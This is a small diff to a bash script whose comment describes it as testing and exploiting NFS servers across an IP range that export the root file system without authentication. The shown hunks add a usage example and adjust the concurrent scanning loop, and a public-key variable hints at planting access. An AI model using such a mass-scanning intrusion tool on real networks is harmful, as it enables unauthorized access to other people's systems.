@@ -1,6 +1,7 @@
 #!/bin/bash
 
 #test and exploit nfs servers in ip/mask that export root file system and don't implement any form of authentication
+#example: ./nfs.sh 192.168.128.0/17
 
 nfsport=2049
 public_key=mypk
@@ -69,7 +70,7 @@ basen=$(ip2n $bip)
 for ((i=0;i<$((1<<(32-mask)));i++)); do
     ip=$(n2ip $((basen+i)))
     echo "Processing $ip"
-    $(helloIP $ip) &
+    helloIP $ip &
     ((c++))
     if [[ $c -eq $concurrencyLevel ]]; then
     	sleep $rest
